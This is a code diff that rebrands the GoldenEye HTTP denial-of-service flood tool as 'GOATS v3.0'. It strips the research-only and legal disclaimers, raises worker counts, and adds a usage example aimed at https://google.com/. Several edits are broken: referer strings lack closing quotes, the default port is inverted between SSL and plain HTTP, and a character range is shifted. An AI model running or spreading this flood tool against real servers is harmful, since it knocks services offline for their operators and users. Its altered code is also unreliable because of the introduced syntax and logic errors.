@@ -3,41 +3,26 @@
 """
 $Id: $
 
-     /$$$$$$            /$$       /$$                     /$$$$$$$$                    
-    /$$__  $$          | $$      | $$                    | $$_____/                    
-   | $$  \__/  /$$$$$$ | $$  /$$$$$$$  /$$$$$$  /$$$$$$$ | $$       /$$   /$$  /$$$$$$ 
-   | $$ /$$$$ /$$__  $$| $$ /$$__  $$ /$$__  $$| $$__  $$| $$$$$   | $$  | $$ /$$__  $$
-   | $$|_  $$| $$  \ $$| $$| $$  | $$| $$$$$$$$| $$  \ $$| $$__/   | $$  | $$| $$$$$$$$
-   | $$  \ $$| $$  | $$| $$| $$  | $$| $$_____/| $$  | $$| $$      | $$  | $$| $$_____/
-   |  $$$$$$/|  $$$$$$/| $$|  $$$$$$$|  $$$$$$$| $$  | $$| $$$$$$$$|  $$$$$$$|  $$$$$$$
-    \______/  \______/ |__/ \_______/ \_______/|__/  |__/|________/ \____  $$ \_______/
-                                                                     /$$  | $$          
-                                                                    |  $$$$$$/          
-                                                                     \______/           
+   ********    *******       **     **********  ********
+  **//////**  **/////**     ****   /////**///  **////// 
+ **      //  **     //**   **//**      /**    /**       
+/**         /**      /**  **  //**     /**    /*********
+/**    *****/**      /** **********    /**    ////////**
+//**  ////**//**     ** /**//////**    /**           /**
+ //********  //*******  /**     /**    /**     ******** 
+  ////////    ///////   //      //     //     ////////         
                                                                                                                                                                                                       
 
 
 This tool is a dos tool that is meant to put heavy load on HTTP servers
 in order to bring them to their knees by exhausting the resource pool.
 
-This tool is meant for research purposes only
-and any malicious usage of this tool is prohibited.
-
 @author Jan Seidl <http://wroot.org/>
+@eddited by @doubleparllax <https://godseye.pw/>
 
-@date 2014-02-18
-@version 2.1
+@date 2017-11-20
+@version 3.0
 
-@TODO Test in python 3.x
-
-LICENSE:
-This software is distributed under the GNU General Public License version 3 (GPLv3)
-
-LEGAL NOTICE:
-THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL USE ONLY!
-IF YOU ENGAGE IN ANY ILLEGAL ACTIVITY
-THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR IT.
-BY USING THIS SOFTWARE YOU AGREE WITH THESE TERMS.
 """
 
 from multiprocessing import Process, Manager, Pool
@@ -67,12 +52,12 @@ METHOD_GET  = 'get'
 METHOD_POST = 'post'
 METHOD_RAND = 'random'
 
-JOIN_TIMEOUT=1.0
+JOIN_TIMEOUT=2.5
 
-DEFAULT_WORKERS=10
+DEFAULT_WORKERS=15
 DEFAULT_SOCKETS=500
 
-GOLDENEYE_BANNER = 'GoldenEye v2.1 by Jan Seidl <jseidl@wroot.org>'
+GOLDENEYE_BANNER = 'GOATS v3.0 by Jan Seidl - Updated by DoubleParallax'
 
 USER_AGENT_PARTS = {
     'os': {
@@ -147,7 +132,7 @@ class GoldenEye(object):
 
     def exit(self):
         self.stats()
-        print "Shutting down GoldenEye"
+        print "Shutting down GOATS"
 
     def __del__(self):
         self.exit()
@@ -163,7 +148,7 @@ class GoldenEye(object):
     def fire(self):
 
         self.printHeader()
-        print "Hitting webserver in mode '{0}' with {1} workers running {2} connections each. Hit CTRL+C to cancel.".format(self.method, self.nr_workers, self.nr_sockets)
+        print "SENDING FLOOD: Method: '{0}' Workers: {1} Conns: {2} ,CTRL+C to KILL.".format(self.method, self.nr_workers, self.nr_sockets)
 
         if DEBUG:
             print "Starting {0} concurrent workers".format(self.nr_workers)
@@ -242,7 +227,7 @@ class Striker(Process):
     # Containers
     url = None
     host = None
-    port = 80
+    port = 443
     ssl = False
     referers = []
     useragents = []
@@ -274,7 +259,7 @@ class Striker(Process):
         self.port = parsedUrl.port
 
         if not self.port:
-            self.port = 80 if not self.ssl else 443
+            self.port = 443 if not self.ssl else 80
 
 
         self.referers = [ 
@@ -282,6 +267,8 @@ class Striker(Process):
             'http://www.bing.com/',
             'http://www.baidu.com/',
             'http://www.yandex.com/',
+            'http://godseye.pw/,
+            'http://yahoo.com/,
             'http://' + self.host + '/'
             ]
 
@@ -294,7 +281,7 @@ class Striker(Process):
     def buildblock(self, size):
         out_str = ''
 
-        _LOWERCASE = range(97, 122)
+        _LOWERCASE = range(95, 120)
         _UPPERCASE = range(65, 90)
         _NUMERIC   = range(48, 57)
 
@@ -547,7 +534,8 @@ def usage():
     print
     print GOLDENEYE_BANNER
     print 
-    print ' USAGE: ./goldeneye.py <url> [OPTIONS]'
+    print ' USAGE: ./goats.py <url> [OPTIONS]'
+    print ' Example: ./goats.py https://google.com/ -w 20 -s 500 -m random'
     print
     print ' OPTIONS:'
     print '\t Flag\t\t\tDescription\t\t\t\t\t\tDefault'
